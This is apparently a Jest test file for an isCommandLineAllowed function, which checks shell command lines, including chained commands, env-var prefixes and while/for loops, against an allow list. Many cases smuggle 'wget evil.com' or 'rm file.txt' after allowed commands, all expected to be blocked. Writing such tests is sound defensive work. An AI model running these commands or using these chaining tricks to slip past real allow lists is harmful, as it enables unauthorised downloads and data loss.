import { isCommandLineAllowed } from '../isCommandLineAllowed.js';

describe('isCommandLineAllowed', () => {
  describe('simple commands', () => {
    it.each([
      { commandLine: 'echo hello world', allowList: ['echo'], expected: true },
      { commandLine: "echo 'hello world", allowList: ['echo'], expected: true },
      { commandLine: 'wget evil.com', allowList: ['echo'], expected: false },
      { commandLine: 'git status', allowList: ['echo', 'git'], expected: true },
      {
        commandLine: 'rm file.txt',
        allowList: ['echo', 'git'],
        expected: false,
      },
      { commandLine: 'echo grep', allowList: ['grep'], expected: false },

      // Complex commands
      {
        commandLine: 'echo hello && wget evil.com',
        allowList: ['echo'],
        expected: false,
      },
      {
        commandLine: 'echo hello; wget evil.com',
        allowList: ['echo'],
        expected: false,
      },
      {
        commandLine: 'echo hello && echo world',
        allowList: ['echo'],
        expected: true,
      },
      {
        commandLine: 'echo hello | wget evil.com',
        allowList: ['echo'],
        expected: false,
      },

      // Commands with environment variables
      {
        commandLine: 'FOO=bar echo hello',
        allowList: ['echo'],
        expected: true,
      },
      {
        commandLine: 'FOO=bar BAR=baz echo hello',
        allowList: ['echo'],
        expected: true,
      },
      {
        commandLine: 'foo=bar echo hello',
        allowList: ['echo'],
        expected: true,
      },
      {
        commandLine: 'FOO=bar wget evil.com',
        allowList: ['echo'],
        expected: false,
      },
      {
        commandLine: 'FOO=bar echo hello && wget evil.com',
        allowList: ['echo'],
        expected: false,
      },
      {
        commandLine: 'echo hello && FOO=bar wget evil.com',
        allowList: ['echo'],
        expected: false,
      },
      {
        commandLine: 'FOO=bar echo hello && BAR=baz echo world',
        allowList: ['echo'],
        expected: true,
      },
      {
        commandLine: 'FOO=bar wget evil.com && BAR=baz rm file.txt',
        allowList: ['echo'],
        expected: false,
      },
    ])(
      '$commandLine with $allowList',
      ({ commandLine, allowList, expected }) => {
        const actual = isCommandLineAllowed(commandLine, allowList);
        expect(actual).toBe(expected);
      },
    );
  });

  describe('while loops', () => {
    it.each([
      {
        commandLine: 'while true; do echo hello; done',
        allowList: ['true', 'echo'],
        expected: true,
      },
      {
        commandLine: 'while true; do echo hello; done',
        allowList: ['echo'],
        expected: false,
      },
      {
        commandLine: 'while true; do wget evil.com; done',
        allowList: ['true', 'echo'],
        expected: false,
      },
      {
        commandLine: 'while grep pattern file.txt; do echo found; done',
        allowList: ['grep', 'echo'],
        expected: true,
      },
      {
        commandLine: 'while [ -f /tmp/file ]; do echo waiting; done',
        allowList: ['echo'],
        expected: true,
      },
      {
        commandLine: 'while true; do echo hello; echo world; done',
        allowList: ['true', 'echo'],
        expected: true,
      },
      {
        commandLine: 'while true; do echo hello && wget evil.com; done',
        allowList: ['true', 'echo'],
        expected: false,
      },
      {
        commandLine: 'while true; do echo hello && echo world; done',
        allowList: ['true', 'echo'],
        expected: true,
      },
      {
        commandLine: 'while FOO=bar grep pattern file.txt; do echo found; done',
        allowList: ['grep', 'echo'],
        expected: true,
      },
      {
        commandLine: 'while true; do FOO=bar echo hello; done',
        allowList: ['true', 'echo'],
        expected: true,
      },
      {
        commandLine: 'echo start && while true; do echo loop; done',
        allowList: ['echo', 'true'],
        expected: true,
      },
      {
        commandLine: 'echo start && while true; do wget evil.com; done',
        allowList: ['echo', 'true'],
        expected: false,
      },
      {
        commandLine: 'while true; do echo loop; done && wget evil.com',
        allowList: ['true', 'echo'],
        expected: false,
      },
    ])(
      '$commandLine with $allowList',
      ({ commandLine, allowList, expected }) => {
        const actual = isCommandLineAllowed(commandLine, allowList);
        expect(actual).toBe(expected);
      },
    );
  });

  describe('for loops', () => {
    it.each([
      // Basic for loops
      {
        commandLine: 'for i in a b c; do echo $i; done',
        allowList: ['echo'],
        expected: true,
      },
      {
        commandLine: 'for i in a b c; do wget evil.com; done',
        allowList: ['echo'],
        expected: false,
      },

      // Multiple commands in body
      {
        commandLine: 'for i in 1 2 3; do echo $i; echo done; done',
        allowList: ['echo'],
        expected: true,
      },
      {
        commandLine: 'for i in 1 2 3; do echo $i && wget evil.com; done',
        allowList: ['echo'],
        expected: false,
      },
      {
        commandLine: 'for i in 1 2 3; do echo $i && echo world; done',
        allowList: ['echo'],
        expected: true,
      },

      // With environment variables
      {
        commandLine: 'for i in a b c; do FOO=bar echo $i; done',
        allowList: ['echo'],
        expected: true,
      },

      // In compound commands
      {
        commandLine: 'echo start && for i in 1 2; do echo $i; done',
        allowList: ['echo'],
        expected: true,
      },
      {
        commandLine: 'echo start && for i in 1 2; do wget evil.com; done',
        allowList: ['echo'],
        expected: false,
      },
      {
        commandLine: 'for i in 1 2; do echo $i; done && echo end',
        allowList: ['echo'],
        expected: true,
      },
      {
        commandLine: 'for i in 1 2; do echo $i; done && wget evil.com',
        allowList: ['echo'],
        expected: false,
      },

      // C-style for loops
      {
        commandLine: 'for ((i=0; i<10; i++)); do echo $i; done',
        allowList: ['echo'],
        expected: true,
      },
      {
        commandLine: 'for ((i=0; i<10; i++)); do wget evil.com; done',
        allowList: ['echo'],
        expected: false,
      },
    ])(
      '$commandLine with $allowList',
      ({ commandLine, allowList, expected }) => {
        const actual = isCommandLineAllowed(commandLine, allowList);
        expect(actual).toBe(expected);
      },
    );
  });
});
